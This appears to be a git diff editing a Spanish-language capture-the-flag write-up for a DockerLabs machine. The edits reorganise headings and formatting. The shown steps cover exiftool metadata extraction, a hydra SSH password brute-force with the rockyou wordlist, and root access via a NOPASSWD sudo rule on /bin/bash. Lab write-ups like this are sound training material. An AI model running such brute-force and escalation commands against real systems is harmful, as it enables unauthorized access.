@@ -14,6 +14,13 @@ tags:
   - ssh
   - http
   - tcp
+  - steganography
+  - password attacks
+  - sudo abuse
+  - information gathering
+  - web analysis
+  - vulnerability exploitation
+  - privilege escalation
 
 ---
 ## Information Gathering
@@ -62,13 +69,13 @@ http://127.17.0.2 [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTTPServer[Deb
 ```
 
 ---
-## Web Analysis & Vulnerability Exploitation
+## Web Analysis
 
 Al analizar el servicio web, solo se muestra una página vacía que contiene una imagen. 
 
 ![](assets/img/dockerlabs-writeup-borazuwarahctf/borazuwarahctf1.png)
 
-Al inspeccionar el código fuente de la página, confirmo que el único contenido relevante es la referencia a una imagen con el nombre ```imagen.jpeg```.
+Al inspeccionar el código fuente de la página, confirmo que el único contenido relevante es la referencia a una imagen con el nombre `imagen.jpeg`.
 
 ![](assets/img/dockerlabs-writeup-borazuwarahctf/borazuwarahctf2.png)
 
@@ -84,9 +91,9 @@ imagen.jpeg                                 100%[===============================
 2025-01-04 20:28:53 (1.03 GB/s) - ‘imagen.jpeg’ saved [18667/18667]
 ```
 
-Descargo la imagen y utilizo exiftool para extraer los metadatos. En ellos encuentro un usuario ```borazuwarah```.
+Descargo la imagen y utilizo exiftool para extraer los metadatos. En ellos encuentro un usuario `borazuwarah`.
 
-Después de descargar la imagen del servidor, utilizo exiftool para analizar los metadatos en busca de información útil. Este análisis revela el usuario ```borazuwarah```.
+Después de descargar la imagen del servidor, utilizo exiftool para analizar los metadatos en busca de información útil. Este análisis revela el usuario `borazuwarah`.
 
 ```terminal
 /home/kali/Documents/dockerlabs/borazuwarahctf:-$ exiftool imagen.jpeg
@@ -94,7 +101,10 @@ Después de descargar la imagen del servidor, utilizo exiftool para analizar los
 
 ![](assets/img/dockerlabs-writeup-borazuwarahctf/borazuwarahctf3.png)
 
-Con el nombre de usuario ```borazuwarah```, realizo un ataque de fuerza bruta contra el servicio SSH.
+Con el nombre de usuario `borazuwarah`, realizo un ataque de fuerza bruta contra el servicio SSH.
+
+---
+## Vulnerability Exploitation
 
 ```terminal
 /home/kali/Documents/dockerlabs/borazuwarahctf:-$ sudo hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
@@ -123,7 +133,7 @@ root:x:0:0:root:/root:/bin/bash
 borazuwarah:x:1000:1000::/home/borazuwarah:/bin/bash
 ```
 
-El usuario ```borazuwarah``` tiene permisos completos para ejecutar cualquier comando como cualquier usuario, incluyendo ```root```.
+El usuario `borazuwarah` tiene permisos completos para ejecutar cualquier comando como cualquier usuario, incluyendo `root`.
 
 ```terminal
 borazuwarah@kali:~$ sudo -l
@@ -135,7 +145,7 @@ User borazuwarah may run the following commands on kali:
     (ALL) NOPASSWD: /bin/bash
 ```
 
-Dado que el usuario puede ejecutar ```/bin/bash``` como ```root``` sin proporcionar contraseña, inicio una shell con privilegios de superusuario. La ejecución de este comando eleva mis privilegios al usuario ```root```, confirmando el control completo del sistema.
+Dado que el usuario puede ejecutar `/bin/bash` como `root` sin proporcionar contraseña, inicio una shell con privilegios de superusuario. La ejecución de este comando eleva mis privilegios al usuario `root`, confirmando el control completo del sistema.
 
 ```terminal
 borazuwarah@kali:~$ sudo /bin/bash
